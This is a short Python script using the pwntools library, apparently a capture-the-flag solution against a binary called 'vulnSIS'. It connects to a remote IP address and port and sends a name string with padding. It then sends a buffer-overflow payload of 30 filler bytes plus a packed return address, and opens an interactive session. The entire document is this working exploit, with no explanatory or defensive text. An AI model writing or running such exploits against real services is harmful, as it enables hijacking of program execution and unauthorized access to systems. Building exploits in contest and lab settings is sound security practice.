from pwn import *

# context.arch = "amd64"
# context.binary = "./vulnSIS"
p = remote("14.225.211.39", 13372)
p.sendline(b"VinUni" + b"A"*(20-8) + b"\n")
p.sendline(b"A" * (30) + p64(0x4012b6) + b"\n")
p.interactive()
